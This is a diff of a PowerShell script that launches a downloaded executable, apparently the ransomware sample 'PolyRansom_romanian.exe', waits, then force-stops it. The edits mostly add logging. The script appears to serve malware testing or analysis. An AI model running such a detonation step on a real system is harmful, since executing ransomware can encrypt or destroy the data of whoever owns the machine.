@@ -36,14 +36,16 @@ if (Test-Path $downloadPath) {
     Start-Process -FilePath $downloadPath -Wait
     Start-Sleep -Seconds 10
     
-    $processName = (Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}).Name
+    $process = Get-Process | Where-Object {$_.MainModule.FileName -eq $downloadPath}
     
-    if ($processName) {
-
+    if ($process) {
+        $processName = $process.Name
+        Write-Host "Process name found: $processName"
         Stop-Process -Name $processName -Force
+        Write-Host "Process stopped."
     } else {
-        Write-Host "Process not found"
+        Write-Host "Process associated with PolyRansom_romanian.exe not found."
     }
 } else {
-     Write-Host "Failed to start process."
+    Write-Host "Download path not found."
 }
